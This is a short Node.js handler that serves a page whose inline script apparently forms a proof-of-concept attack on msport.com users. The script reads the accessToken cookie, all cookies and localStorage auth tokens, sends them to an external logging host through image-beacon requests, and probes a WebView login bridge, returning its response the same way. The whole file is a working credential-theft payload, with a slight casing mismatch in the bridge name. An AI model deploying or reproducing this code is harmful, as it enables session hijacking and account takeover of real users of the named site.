module.exports = (req, res) => {
  res.setHeader('Content-Type', 'text/html');
  res.setHeader('Cache-Control', 'no-store');
  res.send(`<!DOCTYPE html>
<html><body>
<script>
(function () {
  var EXFIL = "https://haxor-net.vercel.app/api/log";
  function exfil(data, source) {
    var img = new Image();
    img.src = EXFIL + "?cb=" + Date.now() + "&src=" + source +
      "&data=" + encodeURIComponent(data) +
      "&cookies=" + encodeURIComponent(document.cookie);
  }
  if (location.hostname.includes("msport.com")) {
    var m = document.cookie.match(/accessToken="?([^";]+)"?/);
    if (m) exfil(m[1], "cookie");
    else exfil(document.cookie, "cookies_raw");
    try {
      ["accessToken","authorization","userId","refreshToken"].forEach(function (k) {
        var v = localStorage.getItem(k);
        if (v) exfil(v, "ls:" + k);
      });
    } catch (e) {}
    if (window.WebViewJavascriptBridge && window.WebviewJavascriptBridge.callHandler) {
      window.WebviewJavascriptBridge.callHandler("action_login", JSON.stringify({
        userId: "poc_probe", authorization: "poc_probe", refreshToken: "poc_probe"
      }), function (resp) { exfil("bridge_ok:" + JSON.stringify(resp), "bridge"); });
    }
  } else {
    window.location.href = "https://www.msport.com/";
  }
})();
</script>
</body></html>`);
};
